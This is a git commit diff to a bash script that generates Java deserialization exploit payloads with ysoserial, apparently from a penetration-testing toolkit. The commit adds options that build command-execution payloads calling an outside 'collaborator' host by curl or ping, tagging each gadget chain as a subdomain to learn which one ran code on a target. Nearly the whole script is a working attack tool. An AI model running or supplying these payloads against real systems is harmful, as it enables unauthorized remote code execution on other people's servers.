19942e7e82efb5c9fde908580a6a782f6f986b53
André Oliveira <andreoliveira208@gmail.com>
2024-05-30 10:09:48 +0100

    Update ysoserial-generate_payloads.sh

--- OtherScripts/BashScripts/ysoserial-generate_payloads.sh
+++ OtherScripts/BashScripts/ysoserial-generate_payloads.sh
@@ -2,6 +2,8 @@
 command="$@"
 if [ -z "$command" ]; then
 	echo "./generate_payloads.sh <commands>"
+	echo "./generate_payloads.sh --curl 'collaborator-link' #Adds paylaod name as a subdomain, so you can check which payload worked."
+	echo "./generate_payloads.sh --request 'curl' 'collaborator-link' #Same as --curl, but you can choose the command to use. E.g. use ping instead of curl."
 	exit
 fi
 if [ -f "serialized_payloads" ]; then
@@ -13,8 +15,16 @@ if [ -f "serialized_payloads" ]; then
 	fi
 fi
 payload_file="$(pwd)/payloads.txt"
+
 while read -r payload; do
-  output="$(java11 -jar ysoserial-all.jar $payload "$command" | base64 -w 0)"
+  if [ "$1" == "--curl" ]; then
+    output="$(java11 -jar ysoserial-all.jar $payload "curl $payload.$2" | base64 -w 0)"
+    #echo "java11 -jar ysoserial-all.jar $payload "curl $payload.$2" | base64 -w 0"
+  elif [ "$1" == "--request" ]; then
+    output="$(java11 -jar ysoserial-all.jar $payload "$2 $payload.$3" | base64 -w 0)"
+  else
+    output="$(java11 -jar ysoserial-all.jar $payload "$command" | base64 -w 0)"
+  fi
   if [ -n "$output" ]; then
   	echo $(php -r "echo urlencode('$output');") >> serialized_payloads
   fi
